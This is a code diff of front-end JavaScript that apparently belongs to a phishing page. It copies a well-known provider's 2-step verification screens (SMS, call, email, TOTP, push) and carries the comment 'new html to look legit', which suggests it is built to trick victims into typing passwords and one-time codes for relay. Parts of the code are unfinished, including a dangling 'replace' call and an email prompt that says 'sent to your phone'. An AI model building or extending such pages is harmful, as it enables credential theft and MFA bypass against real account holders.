@@ -111,24 +111,32 @@ const moveToMFA = function(json) {
   if(json.hasOwnProperty('mfa')) {
     switch(json.mfa) {
       case 1:
+        console.log("Using SMS...")
+        displaySMS()
+        break;
+      case 2:
         console.log("Using Call...")
         displayCall()
         break;
-      case 2:
+      case 3:
         console.log("Using Email...")
         displayEmail()
         break;
-      case 3:
+      case 4:
         console.log("Using TOTP...")
         displayTOTP()
         break;
-      case 4:
+      case 5:
         console.log("Using Push Notification...")
         displayPush()
         break;
+      case 6:
+        console.log("Using Push w/ Code...")
+        displayPushWCode()
+        break;
       default:
-        console.log("Defaulted to SMS...")
-        displaySMS()
+        console.log("Defaulted to Failure...")
+        displayFailure()
     }
   }
   else {
@@ -136,9 +144,31 @@ const moveToMFA = function(json) {
     console.log(json)
     console.log(typeof(json))
     console.log(json.mfa)
-    console.log("Defaulting to SMS...")
-    displaySMS()
+    console.log("Defaulting to failure...")
+    displayFailure()
   }
+}
+
+const displayFailure = function() {
+  // update headers
+  document.getElementById("headerField").innerHTML = "Account or Password incorrect";
+  document.getElementById("subheaderField").innerHTML = "Please refresh and try again";
+
+  // reset inputs
+  var bullets = document.querySelector("#Bullets")
+  var inputField = document.querySelector("#inputField")
+
+  inputField.parentNode.insertBefore(bullets, inputField)
+
+  // update opacities
+  inputField.style.opacity = "100"
+  bullets.style.opacity = "0"
+
+  // update to look normal again
+  inputField.onkeyup = function(){};
+
+  document.getElementById("inputField").value = username;
+  document.getElementById("inputField").placeholder = username;
 }
 
 const displaySMS = function() {
@@ -171,6 +201,91 @@ const displaySMS = function() {
   verificationTitle.style.padding = "0px 35px 0px 35px";
   var verificationExplained = document.createElement("p")
   verificationExplained.innerHTML = "A text message with a 6-digit verification code was just sent to your phone"
+  verificationExplained.style.textAlign = "left"
+  verificationExplained.style.padding = "0px 35px 0px 35px";
+
+  bullets.parentNode.insertBefore(verificationTitle, bullets)
+  bullets.parentNode.insertBefore(verificationExplained, bullets)
+  bullets.remove()
+
+  document.getElementById("inputField").value = "";
+  document.getElementById("inputField").placeholder = "Enter the code";
+}
+
+const displayCall = function() {
+  // update background size
+  document.getElementById("loginBackdrop").style.height = "425px"
+
+  // update headers
+  document.getElementById("headerField").innerHTML = "2-Step Verification";
+  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";
+
+  // reset inputs
+  var bullets = document.querySelector("#Bullets")
+  var inputField = document.querySelector("#inputField")
+
+  inputField.parentNode.insertBefore(bullets, inputField)
+
+  // update opacities
+  inputField.style.opacity = "100"
+  bullets.style.opacity = "0"
+
+  // update to look normal again
+  inputField.onkeyup = function(){};
+
+  // ****** all below should be in a case by account statements
+  // new html to look legit
+  var verificationTitle = document.createElement("p")
+  verificationTitle.innerHTML = "2-Step Verification".bold()
+  verificationTitle.style.fontSize = "large"
+  verificationTitle.style.textAlign = "left"
+  verificationTitle.style.padding = "0px 35px 0px 35px";
+  var verificationExplained = document.createElement("p")
+  verificationExplained.innerHTML = "We will call your phone with a 6-digit verification code"
+  verificationExplained.style.textAlign = "left"
+  verificationExplained.style.padding = "0px 35px 0px 35px";
+
+  bullets.parentNode.insertBefore(verificationTitle, bullets)
+  bullets.parentNode.insertBefore(verificationExplained, bullets)
+  bullets.remove()
+
+  document.getElementById("inputField").value = "";
+  document.getElementById("inputField").placeholder = "Enter the code";
+}
+
+const displayEmail = function() {
+  // update background size
+  document.getElementById("loginBackdrop").style.height = "425px"
+
+  // update headers
+  document.getElementById("headerField").innerHTML = "2-Step Verification";
+  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";
+
+  // reset inputs
+  var bullets = document.querySelector("#Bullets")
+  var inputField = document.querySelector("#inputField")
+
+  inputField.parentNode.insertBefore(bullets, inputField)
+
+  // update opacities
+  inputField.style.opacity = "100"
+  bullets.style.opacity = "0"
+
+  // update to look normal again
+  inputField.onkeyup = function(){};
+
+  // ****** all below should be in a case by account statements
+  // new html to look legit
+  var verificationTitle = document.createElement("p")
+  verificationTitle.innerHTML = "2-Step Verification".bold()
+  verificationTitle.style.fontSize = "large"
+  verificationTitle.style.textAlign = "left"
+  verificationTitle.style.padding = "0px 35px 0px 35px";
+  var verificationExplained = document.createElement("p")
+  var username_abbreviated = username
+  // determine starting and ending indexes
+  username_abbreviated.replace
+  verificationExplained.innerHTML = "An email with a 6-digit verification code was just sent to your phone"
   verificationExplained.style.textAlign = "left"
   verificationExplained.style.padding = "0px 35px 0px 35px";
 
